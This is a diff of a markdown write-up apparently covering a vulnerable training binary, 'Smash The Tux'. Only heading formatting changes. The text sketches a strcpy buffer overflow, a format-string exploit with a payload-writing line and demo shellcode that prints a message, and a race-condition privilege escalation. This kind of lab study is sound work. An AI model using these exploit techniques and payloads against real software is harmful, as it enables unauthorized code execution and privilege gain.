@@ -1,13 +1,13 @@
 
 # Smash The Tux
 
-##0x00
+## 0x00
 - strcpy buffer overflow
 
 simply pass in the large buffer and point to the address of the start of the buffer for your boomcode
 
 
-##0x01
+## 0x01
 - format string, no validation
 
 ```bash
@@ -19,7 +19,7 @@ open('/tmp/foo.bin', 'wb').write("\xcc\xcc\xcc\xcc" + '\x54\x97\x04\x08' + '\x55
 SHELLCODE += '\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff\xff\xff\x62\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6d\x21\x0a\x0d'
 ```
 
-0x02
+## 0x02
 - privilege escalation
 - theres a race conditions for uid and accessing the file, so we will override the memory via gdb as user and show it works
 
